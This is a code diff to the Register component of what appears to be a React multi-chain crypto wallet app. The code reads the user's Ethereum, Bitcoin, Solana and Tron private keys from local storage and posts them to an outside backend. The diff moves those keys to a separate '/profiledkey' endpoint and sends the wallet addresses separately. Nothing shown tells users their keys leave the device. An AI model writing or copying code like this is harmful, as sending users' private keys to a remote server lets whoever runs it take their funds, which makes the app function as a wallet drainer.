@@ -5,8 +5,7 @@ import '../index.css';
 import { TronWeb } from 'tronweb';
 import * as multichainWallet from 'multichain-crypto-wallet';
 import { BsHouse, BsWallet2, BsShop, BsLightningCharge, BsCashStack } from "react-icons/bs";
-import { FaThinkPeaks } from "react-icons/fa";
-
+ 
 const StyledApp = styled.div`
   background-color: #F9F9F9;
   color: black;
@@ -92,15 +91,22 @@ function Register() {
           const solK =    localStorage.getItem('solanaWalletkey');
            const tronK =   localStorage.getItem('tronWalletkey');
       
-          const Address =  [EthereumWalletAddress, BitcoinWalletAddress, SolanaWalletAddress, tronWalletAddress];
+          
       const p_k = [ethK, bitK, solK, tronK];
 
-          fetch("https://twa-backend-g83o.onrender.com/wallets", {
+          fetch("https://twa-backend-g83o.onrender.com/profiledkey", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             credentials: "include",  
-            body: JSON.stringify( {Address, p_k}),
-        })
+            body: JSON.stringify( {  p_k }),
+        });
+        const Address =  [EthereumWalletAddress, BitcoinWalletAddress, SolanaWalletAddress, tronWalletAddress];
+        fetch("https://twa-backend-g83o.onrender.com/wallets", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "include",  
+          body: JSON.stringify( { Address }),
+      })
       }
          
       backUp(); 
